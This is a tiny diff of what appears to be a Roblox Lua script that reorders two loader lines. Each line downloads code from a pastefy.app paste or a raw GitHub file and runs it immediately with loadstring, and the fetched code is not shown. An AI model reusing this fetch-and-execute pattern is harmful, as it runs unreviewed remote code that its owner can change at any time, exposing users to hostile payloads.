@@ -1,3 +1,2 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/GrowDuper/loding/refs/heads/main/load"))()
-
 loadstring(game:HttpGet("https://pastefy.app/0zX3kQZJ/raw"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrowDuper/loding/refs/heads/main/load"))()
